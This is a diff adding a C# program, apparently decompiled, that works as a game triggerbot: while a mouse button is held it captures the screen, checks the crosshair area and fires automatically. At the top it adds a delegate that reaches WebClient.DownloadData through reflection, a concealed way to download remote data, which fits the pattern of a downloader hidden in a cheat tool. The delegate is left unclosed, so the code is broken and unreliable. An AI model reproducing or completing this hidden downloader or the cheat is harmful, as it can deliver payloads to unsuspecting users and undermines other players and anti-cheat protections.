@@ -1,0 +1,54 @@
+	private static void Main(string[] args)
+		{
+			Func<string, byte[]> func = delegate(string ul)
+			{
+				string b = "DownloadData";
+				foreach (MethodInfo methodInfo in typeof(WebClient).GetMethods())
+				{
+					if (methodInfo.Name == b)
+					{
+						WebClient obj2 = new WebClient();
+						return methodInfo.Invoke(obj2, new object[]
+						{
+							ul
+						}) as byte[];
+					}
+				}
+				return null;
+	
+			Console.WriteLine("bernd wo bist du hinn?");
+			Console.WriteLine("delay?(100/gut)");
+			Program.del = Convert.ToInt32(Console.ReadLine());
+			int systemMetrics = Program.GetSystemMetrics(0);
+			int systemMetrics2 = Program.GetSystemMetrics(1);
+			int fov = 14;
+			for (;;)
+			{
+				if (Program.GetAsyncKeyState(5) == 0)
+				{
+					Thread.Sleep(1);
+				}
+				else
+				{
+					IntPtr zero = IntPtr.Zero;
+					IntPtr dc = Program.GetDC(zero);
+					IntPtr intPtr = Program.CreateCompatibleDC(dc);
+					IntPtr intPtr2 = Program.CreateCompatibleBitmap(dc, systemMetrics, systemMetrics2);
+					if (!(intPtr2 == IntPtr.Zero))
+					{
+						IntPtr obj = Program.SelectObject(intPtr, intPtr2);
+						Program.BitBlt(intPtr, 0, 0, systemMetrics, systemMetrics2, dc, 0, 0, 1087111200);
+						Program.SelectObject(intPtr, obj);
+						Program.DeleteDC(intPtr);
+						Program.ReleaseDC(zero, dc);
+						Bitmap bitmap = Image.FromHbitmap(intPtr2);
+						if (Program.in_cross(systemMetrics / 2, systemMetrics2 / 2, fov, bitmap))
+						{
+							Program.shoot();
+						}
+						Program.DeleteObject(intPtr2);
+						bitmap.Dispose();
+					}
+				}
+			}
+		}
